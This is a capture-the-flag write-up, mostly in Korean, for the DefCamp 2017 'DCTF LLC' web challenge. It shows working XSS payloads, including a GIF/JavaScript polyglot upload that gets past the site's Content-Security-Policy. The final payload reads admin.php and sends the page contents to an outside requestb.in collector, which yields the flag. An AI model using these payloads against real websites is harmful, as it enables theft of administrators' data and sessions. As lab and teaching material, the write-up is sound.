# [2017_DefCamp] \[Web] DCTF LLC

```
We are looking for your feedback about our new amazing company! :-) 
Update 11:00 EEST: Do you see what the "admin" is seeing?
```



### Solution

####Reflective XSS

```html
$http -f POST https://llc.dctf-quals-17.def.camp email="a@b.c" name="aaa" message="<script>alert('111')</script>"

HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Length: 1124
Content-Security-Policy: default-src 'none'; img-src 'self' *.imgur.com *.ibb.co; script-src 'self'; connect-src 'self'; style-src 'self' fonts.googleapis.com fonts.gstatic.com 'unsafe-inline'; font-src 'self' fonts.gstatic.com  fonts.googleapis.com;
Content-Type: text/html; charset=UTF-8
Date: Tue, 03 Oct 2017 03:33:20 GMT
Server: nginx/1.10.3 (Ubuntu)
Strict-Transport-Security: max-age=31536000; includeSubdomains
Vary: Accept-Encoding
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block

<!DOCTYPE html>
<html>
<head>
	<title>DCTF LLC</title>
	<script src="jquery.js.min"></script>
	<style>
		@import url(https://fonts.googleapis.com/css?family=Merriweather);
		*,
		*:before,
		*:after {
		  -moz-box-sizing: border-box;
		  -webkit-box-sizing: border-box;
		  box-sizing: border-box;
		}

		html, body {
		  background: #f1f1f1;
		  font-family: 'Merriweather', sans-serif;
		  padding: 1em;
		}

		h1 {
		  text-align: center;
		  color: #a8a8a8;
		  text-shadow: 1px 1px 0 white;
		}

		form {
		  max-width: 600px;
		  text-align: center;
		  margin: 20px auto;
		}
		form input, form textarea {
		  border: 0;
		  outline: 0;
		  padding: 1em;
		  -moz-border-radius: 8px;
		  -webkit-border-radius: 8px;
		  border-radius: 8px;
		  display: block;
		  width: 100%;
		  margin-top: 1em;
		  font-family: 'Merriweather', sans-serif;
		  -moz-box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
		  -webkit-box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
		  box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
		  resize: none;
		}
		form input:focus, form textarea:focus {
		  -moz-box-shadow: 0 0px 2px #e74c3c !important;
		  -webkit-box-shadow: 0 0px 2px #e74c3c !important;
		  box-shadow: 0 0px 2px #e74c3c !important;
		}
		form #input-submit {
		  color: white;
		  background: #e74c3c;
		  cursor: pointer;
		}
		form #input-submit:hover {
		  -moz-box-shadow: 0 1px 1px 1px rgba(170, 170, 170, 0.6);
		  -webkit-box-shadow: 0 1px 1px 1px rgba(170, 170, 170, 0.6);
		  box-shadow: 0 1px 1px 1px rgba(170, 170, 170, 0.6);
		}
		form textarea {
		  height: 126px;
		}

		.half {
		  float: left;
		  width: 48%;
		  margin-bottom: 1em;
		}

		.right {
		  width: 50%;
		}

		.left {
		  margin-right: 2%;
		}

		@media (max-width: 480px) {
		  .half {
		    width: 100%;
		    float: none;
		    margin-bottom: 0;
		  }
		}
		/* Clearfix */
		.cf:before,
		.cf:after {
		  content: " ";
		  /* 1 */
		  display: table;
		  /* 2 */
		}

		.cf:after {
		  clear: both;
		}

		h3 {
			color:#ccc;
		}
	</style>
</head>
<body>
	<h1>DCTF LLC</h1>
	<div align="center"><h3>Our website is work in progress but you could send us some of your wishes! </h3></div>
	<div align='center'><h4>Message Sent. Here's the preview:</h4>
		<div>
		Name: aaa<br>
		Email: a@b.c<br>
		Message: <script>alert('111')</script><br>
		<img src=''>
		</div></div>	<form class="cf" method="POST" enctype="multipart/form-data">
	  <div class="half left cf">
	    <input type="text" id="name" name="name" placeholder="Name">
	    <input type="email" id="email" name="email" placeholder="Email address">
	    <input type="file" id="file" name="file" placeholder="Upload Attachments">
	  </div>
	  <div class="half right cf">
	    <textarea name="message" type="text" id="message" name="message" placeholder="Message"></textarea>
	  </div>  
	  <input type="submit" value="Submit" id="input-submit">
	</form>
</body>
</html>
```

message 파라미터에 넘겨준 인자가 그대로 페이지에 나타납니다.

```
		Name: aaa<br>
		Email: a@b.c<br>
		Message: <script>alert('111')</script><br>
```

메시지를 보내면 봇이 이를 읽어주는데, 이 덕분에 admin에 대한 XSS 공격이 가능합니다.

```
content-security-policy:default-src 'none'; img-src 'self' *.imgur.com *.ibb.co; script-src 'self'; connect-src 'self'; style-src 'self' fonts.googleapis.com fonts.gstatic.com 'unsafe-inline'; font-src 'self' fonts.gstatic.com  fonts.googleapis.com;
```

하지만 한가지 문제가 존재합니다. CSP 중에 `script-src 'self';` 이 부분 때문에 외부 링크를 include할 수 없습니다.



#### File Upload

파일 업로드 기능에서는 500byte 이하의 이미지 파일만 업로드할 수 있습니다. 이미지 업로드 시, 시그니처와 확장자를 체크하는데 아래와 같은 방법으로 자바스크립트를 넣을 수 있습니다.

```
GIF89a='GIMODDI';alert(1);
```



####Exploit

아래와 같이 payload.gif 파일을 작성합니다.

```
GIF89a='GIMODDI';document.location="https://requestb.in/1betnwk1";
```

```
		Name: aaa<br>
		Email: a@b.c<br>
		Message: 111<br>
		<img src='__ab61bf39aaa08dd942c05a8767a150c8/payload.gif'>
```

파일을 업로드하면 이미지 파일의 주소를 알려주는데, 이를 통해 message 부분에서 XSS 코드를 작성합니다.

```
http -f POST https://llc.dctf-quals-17.def.camp email="a@b.c" name="aaa" message="<script src='__ab61bf39aaa08dd942c05a8767a150c8/payload.gif'></script>"
HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Length: 1154
Content-Security-Policy: default-src 'none'; img-src 'self' *.imgur.com *.ibb.co; script-src 'self'; connect-src 'self'; style-src 'self' fonts.googleapis.com fonts.gstatic.com 'unsafe-inline'; font-src 'self' fonts.gstatic.com  fonts.googleapis.com;
Content-Type: text/html; charset=UTF-8
Date: Tue, 03 Oct 2017 04:02:33 GMT
Server: nginx/1.10.3 (Ubuntu)
Strict-Transport-Security: max-age=31536000; includeSubdomains
Vary: Accept-Encoding
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
```

그러면 아래와 같은 내용을 확인할 수 있습니다.

```
Accept-Encoding: gzip
Cookie: __cfduid=d8c8eca22ffed482d0d816ebe7ae673731506696251
X-Request-Id: c992ffaf-3530-4d81-9280-98bd12a2f8ce
Cf-Ray: 3a7cc881dbb62372-FRA
Cf-Connecting-Ip: 45.76.95.55
Cf-Visitor: {"scheme":"https"}
Host: requestb.in
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: close
Connect-Time: 0
Accept-Language: en-US,*
Cf-Ipcountry: DE
Total-Route-Time: 0
Referer: https://llc.dctf-quals-17.def.camp//bot.php?id=8223
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Via: 1.1 vegur
```

Referer에서 bot.php가 있다는 것을 알 수 있는데 내용을 긁어와도 flag는 없습니다.

삽질을 좀 하다 보면 admin.php가 있다는 사실을 알 수 있는데 여기에 flag가 있습니다.

```
GIF89a='GIMODDI';var xh = new XMLHttpRequest();xh.open("GET", "admin.php", false);xh.send();document.location="https://requestb.in/1betnwk1?aaa="+btoa(xh.responseText);
```

ajax를 통해 payload를 작성한 후 똑같은 방식으로 공격을 진행합니다.

```
QUERYSTRING

aaa: RENURns4MDhmNTBjYTNmMzE4MmEzMGU3NmJiOWZjYzBmZGNiN2Y3NWY0Y2U1OTdmN2FiZTE3OTNlMzk0MmFjZjNlYzllfQ==
```

base64 decode

```
DCTF{808f50ca3f3182a30e76bb9fcc0fdcb7f75f4ce597f7abe1793e3942acf3ec9e}
```

